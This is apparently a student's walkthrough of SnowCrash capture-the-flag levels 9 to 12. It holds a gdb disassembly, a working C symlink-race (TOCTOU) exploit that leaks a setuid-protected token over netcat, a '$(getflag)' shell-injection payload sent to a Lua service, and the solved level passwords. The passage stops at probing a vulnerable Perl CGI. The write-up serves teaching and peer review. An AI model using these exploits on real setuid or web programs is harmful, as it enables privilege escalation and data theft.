   0x08048930 <+354>:   call   0x80486cb <isLib>
   0x08048935 <+359>:   test   %eax,%eax
   0x08048937 <+361>:   je     0x8048946 <main+376>
   0x08048939 <+363>:   movl   $0x1,0x24(%esp)
   0x08048941 <+371>:   jmp    0x8048a51 <main+643>
   0x08048946 <+376>:   cmpl   $0x0,0x24(%esp)
   0x0804894b <+381>:   je     0x8048a51 <main+643>
   0x08048951 <+387>:   movl   $0x8048c30,0x4(%esp) ; (gdb)printf "%s", 0x8048c30 -> 'ld'
   0x08048959 <+395>:   lea    0x2c(%esp),%eax
   0x0804895d <+399>:   mov    %eax,(%esp)
   0x08048960 <+402>:   call   0x80486cb <isLib>
   0x08048965 <+407>:   test   %eax,%eax
   0x08048967 <+409>:   je     0x8048a0e <main+576>
   0x0804896d <+415>:   cmpl   $0x2,0x8(%ebp)
   0x08048971 <+419>:   jne    0x80489e4 <main+534>
   0x08048973 <+421>:   jmp    0x8048996 <main+456>
   0x08048975 <+423>:   mov    0x1c(%esp),%eax
   0x08048979 <+427>:   add    $0x4,%eax
   0x0804897c <+430>:   mov    (%eax),%edx
   0x0804897e <+432>:   mov    0x20(%esp),%eax
   0x08048982 <+436>:   add    %edx,%eax
   0x08048984 <+438>:   movzbl (%eax),%eax
   0x08048987 <+441>:   movsbl %al,%eax
   0x0804898a <+444>:   add    0x20(%esp),%eax
   0x0804898e <+448>:   mov    %eax,(%esp)
   0x08048991 <+451>:   call   0x80484c0 <putchar@plt> ; print character in a while loop with a offset
   0x08048996 <+456>:   addl   $0x1,0x20(%esp) ; increment character offset
   0x0804899b <+461>:   mov    0x20(%esp),%ebx
   0x0804899f <+465>:   mov    0x1c(%esp),%eax
   0x080489a3 <+469>:   add    $0x4,%eax
   0x080489a6 <+472>:   mov    (%eax),%eax
   0x080489a8 <+474>:   movl   $0xffffffff,0x18(%esp)
   0x080489b0 <+482>:   mov    %eax,%edx
   0x080489b2 <+484>:   mov    $0x0,%eax
   0x080489b7 <+489>:   mov    0x18(%esp),%ecx
   0x080489bb <+493>:   mov    %edx,%edi
   0x080489bd <+495>:   repnz scas %es:(%edi),%al
   0x080489bf <+497>:   mov    %ecx,%eax
   0x080489c1 <+499>:   not    %eax
   0x080489c3 <+501>:   sub    $0x1,%eax
   0x080489c6 <+504>:   cmp    %eax,%ebx
   0x080489c8 <+506>:   jb     0x8048975 <main+423>
   0x080489ca <+508>:   mov    0x804a060,%eax
   0x080489cf <+513>:   mov    %eax,0x4(%esp)
   0x080489d3 <+517>:   movl   $0xa,(%esp)
   0x080489da <+524>:   call   0x80484d0 <fputc@plt>
   0x080489df <+529>:   jmp    0x8048a75 <main+679>
   0x080489e4 <+534>:   mov    0x804a040,%eax
   0x080489e9 <+539>:   mov    %eax,%edx
   0x080489eb <+541>:   mov    $0x8048c34,%eax
   0x080489f0 <+546>:   mov    %edx,0xc(%esp)
   0x080489f4 <+550>:   movl   $0x22,0x8(%esp)
   0x080489fc <+558>:   movl   $0x1,0x4(%esp)
   0x08048a04 <+566>:   mov    %eax,(%esp)
   0x08048a07 <+569>:   call   0x8048460 <fwrite@plt>
   0x08048a0c <+574>:   jmp    0x8048a75 <main+679>
   0x08048a0e <+576>:   movl   $0x8048c57,0x4(%esp)
   0x08048a16 <+584>:   lea    0x2c(%esp),%eax
   0x08048a1a <+588>:   mov    %eax,(%esp)
   0x08048a1d <+591>:   call   0x8048646 <afterSubstr>
   0x08048a22 <+596>:   test   %eax,%eax
   0x08048a24 <+598>:   jne    0x8048a51 <main+643>
   0x08048a26 <+600>:   mov    0x804a040,%eax
   0x08048a2b <+605>:   mov    %eax,%edx
   0x08048a2d <+607>:   mov    $0x8048c68,%eax
   0x08048a32 <+612>:   mov    %edx,0xc(%esp)
   0x08048a36 <+616>:   movl   $0x30,0x8(%esp)
   0x08048a3e <+624>:   movl   $0x1,0x4(%esp)
   0x08048a46 <+632>:   mov    %eax,(%esp)
   0x08048a49 <+635>:   call   0x8048460 <fwrite@plt>
   0x08048a4e <+640>:   jmp    0x8048a75 <main+679>
   0x08048a50 <+642>:   nop
   0x08048a51 <+643>:   mov    0x28(%esp),%eax
   0x08048a55 <+647>:   mov    %eax,0x8(%esp)
   0x08048a59 <+651>:   movl   $0x100,0x4(%esp)
   0x08048a61 <+659>:   lea    0x2c(%esp),%eax
   0x08048a65 <+663>:   mov    %eax,(%esp)
   0x08048a68 <+666>:   call   0x80485d4 <syscall_gets> ; gets(0);
   0x08048a6d <+671>:   test   %eax,%eax
   0x08048a6f <+673>:   jne    0x8048921 <main+339> ; jump to 339 if %eax != 0
   0x08048a75 <+679>:   jmp    0x8048a77 <main+681> ; else exit()
   0x08048a77 <+681>:   mov    0x12c(%esp),%edx
   0x08048a7e <+688>:   xor    %gs:0x14,%edx
   0x08048a85 <+695>:   je     0x8048a8c <main+702>
   0x08048a87 <+697>:   call   0x8048450 <__stack_chk_fail@plt>
   0x08048a8c <+702>:   lea    -0x8(%ebp),%esp
   0x08048a8f <+705>:   pop    %ebx
   0x08048a90 <+706>:   pop    %edi
   0x08048a91 <+707>:   pop    %ebp
   0x08048a92 <+708>:   ret
End of assembler dump.
```

### Then realizing I should have listened

After some time I realized the token file was readable...

```bash
level09@SnowCrash:~$ ./level09  abcdef
acegik

level09@SnowCrash:~$ xxd ./token
0000000: 6634 6b6d 6d36 707c 3d82 7f70 826e 8382  f4kmm6p|=..p.n..
0000010: 4442 8344 757b 7f8c 890a                 DB.Du{....
```

```bash
level09@SnowCrash:~$ cat /tmp/tmp.DbWvKJIpjK
import sys

for line in sys.stdin:
        offset = 0
        for c in line:
                print(chr(ord(c) - offset)),
                offset += 1
```

```bash
level09@SnowCrash:~$ cat ./token  | python /tmp/tmp.DbWvKJIpjK  | tr -d ' '
f3iji1ju5yuevaus41q1afiuq
```

### Goto level10

```bash
level09@SnowCrash:~$ su flag09
Password: <<< 'f3iji1ju5yuevaus41q1afiuq'
Don't forget to launch getflag !

flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
```

## Level10

```bash
level10@SnowCrash:~$ ls -lA
total 28
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

```bash
level10@SnowCrash:~$ ltrace ./level10
__libc_start_main(0x80486d4, 1, 0xbffff7b4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
)                                                        = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

level10@SnowCrash:~$ ltrace ./level10  flag
__libc_start_main(0x80486d4, 2, 0xbffff7b4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
)                                                        = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

level10@SnowCrash:~$ ltrace ./level10  flag 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
access("flag", 4)                                                                                                 = -1
printf("You don't have access to %s\n", "flag"You don't have access to flag
)                                                                   = 30
+++ exited (status 30) +++
level10@SnowCrash:~$
```

```bash
level10@SnowCrash:~$ nc -l 6969 # In a new window
```

### Exploit (1st attempt)

The goal of this was to run the program through gdb to a symlink pointing to a readable file, then make a breakpoint after the access() call, change the file pointed by the symlink to the token file, and continue the execution of the program

- Create a symlink to a file we're sure will exists for access()

```bash
level10@SnowCrash:~$ ln -s /proc/self/maps /tmp/symlink
```

- Then in GDB, run the program until the access() call

```bash
level10@SnowCrash:~$ gdb ./level10
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level10/level10...done.

(gdb) break main
Breakpoint 1 at 0x80486e7: file level10.c, line 12.

(gdb) run /tmp/symlink 127.0.0.1
Starting program: /home/user/level10/level10 /tmp/symlink 127.0.0.1

Breakpoint 1, main (argc=3, argv=0xbffff774) at level10.c:12
12      level10.c: No such file or directory.

(gdb) break *0x0804874e ; one instruction after access()
Breakpoint 2 at 0x804874e: file level10.c, line 24.

(gdb) continue
Continuing.

Breakpoint 2, 0x0804874e in main (argc=3, argv=0xbffff774) at level10.c:24
24      in level10.c
```

- In our shell, change the file pointed by the symlink

```bash
level10@SnowCrash:~$ rm /tmp/symlink

level10@SnowCrash:~$ ln -s /home/user/level10/flag /tmp/symlink
```

- Then in GDB, continue the execution of the program

```bash
(gdb) continue
Continuing.
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. Damn. Unable to open file
[Inferior 1 (process 3688) exited with code 01]
```

Unfortunately, the setuid() call in the program is not executed when running the program with ptrace() (as gdb does), so this cannot work, I chose to kept this attempt to explain this to my mates doing the peer-reviews

- https://unix.stackexchange.com/questions/15911/can-gdb-debug-suid-root-programs

### Exploit (2nd attempt)

```bash
man access
...
NOTES
       Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason,  the
       use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

- https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole

- http://www.csl.sri.com/users/ddean/papers/usenix04.pdf

The idea here would be to switch the file pointed by a symlink between the access() and open() calls of the `level10` program.

To do this, we'll make a binary that'll fork() to execute the `level10` binary, and while it's running, change the pointed location of our symlink


- Create a temporary directory with rights and the following c file

```bash
cd $(mktemp -d)
nano symlink_spam.c
```

##### Symlink_spam.c:

```c
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#define SYMLINK_TEMP_TARGET "/proc/self/stat"
#define SYMLINK_END_TARGET "/home/user/level10/token"
#define SYMLINK_LOCATION "/tmp/link"

const char* table[] = {
    "/home/user/level10/level10",
    SYMLINK_LOCATION,
    "127.0.0.1"
};

int             main(int ac, char **av, char **envp)
{
        int             CYCLES=1250000;

        symlink(SYMLINK_TEMP_TARGET, SYMLINK_LOCATION);
        if (fork() == 0) {
                execve("/home/user/level10/level10", table, envp);
                strerror(errno); // Used for debugging with strace -f
                exit(0);
        }
        while (CYCLES--)
                ;
        unlink(SYMLINK_LOCATION);
        symlink(SYMLINK_END_TARGET, SYMLINK_LOCATION);
        return (0);
}
```

- Execute our program in a loop

```bash
while [ 1 ]; do rm /tmp/link ; gcc ./symlink_spam.c && ./a.out ; done;
```

- And after some time in our netcat shell:

```bash
level10@SnowCrash:~$ while [ 1 ]; do echo ------------------------ ; nc -l 6969; done;
...
------------------------
.*( )*.
30633 (level10) R 30632 30631 3564 34820 30631 0 137 0 0 0 0 0 0 0 20 0 1 0 1583431 2052096 70 4294967295 134512640 1345
15796 3221223296 3221218936 3086865448 0 0 0 0 0 0 0 17 0 0 0 0 0 0
------------------------
.*( )*.
------------------------
.*( )*.
------------------------
.*( )*.
------------------------
.*( )*.
30781 (level10) R 30780 30779 3564 34820 30779 0 137 0 0 0 0 0 0 0 20 0 1 0 1583539 2052096 70 4294967295 134512640 1345
15796 3221223296 3221218936 3086865448 0 0 0 0 0 0 0 17 0 0 0 0 0 0
------------------------
.*( )*.
------------------------
.*( )*.
------------------------
.*( )*.
woupa2yuojeeaaed06riuj63c
------------------------
.*( )*.
woupa2yuojeeaaed06riuj63c
------------------------
.*( )*.
31404 (level10) R 31403 31403 3564 34820 31403 0 137 0 0 0 0 0 0 0 20 0 1 0 1584507 2052096 70 4294967295 134512640 1345
15796 3221223296 3221218936 3086865448 0 0 0 0 0 0 0 17 0 0 0 0 0 0
------------------------
```

### Goto level11

```bash
level10@SnowCrash:/tmp/tmp.PvcifhUUhs$ su flag10
Password: <<< 'woupa2yuojeeaaed06riuj63c'
Don\'t forget to launch getflag !

flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

flag10@SnowCrash:~$ su level11
Password: <<< 'feulo4b72j7edeahuete3no7c'
```

## Level11

```bash
level11@SnowCrash:~$ ls -lA
total 16
-r-x------ 1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------ 1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------ 1 level11 level11  675 Apr  3  2012 .profile
```

```lua
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

### Exploit

When reversing the hardcoded SHA1 hash in the source code, we get `NotSoEasy`... which is quite self-explanatory.

Instead we can do a basic shell exploitation using the string formating used for the `pass` variable, we'll print the content of `getflag` to a new file, writeable by the `flag11` user

```bash
level11@SnowCrash:~$ mktemp
/tmp/tmp.giOH6KoyPU

level11@SnowCrash:~$ chmod 777 /tmp/tmp.giOH6KoyPU

level11@SnowCrash:~$ nc -q3 127.0.0.1 5151 <<< 'test > /tmp/tmp.giOH6KoyPU' && cat /tmp/tmp.giOH6KoyPU
Password: Erf nope..
test

level11@SnowCrash:~$ nc -q3 127.0.0.1 5151 <<< '$(getflag) > /tmp/tmp.giOH6KoyPU' && cat /tmp/tmp.giOH6KoyPU
Password: Erf nope..
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

### Goto level12

```bash
level11@SnowCrash:~$ su level12
Password: <<< 'fa6v5ateaw21peobuub8ipe6s'
```

## Level12

```bash
level12@SnowCrash:~$ ls -lA
total 16
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

```perl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

```bash
level12@SnowCrash:~$ curl 127.0.0.1:4646
..
```

```bash
level12@SnowCrash:~$ curl '127.0.0.1:4646?x=test&y=test2'
.
```


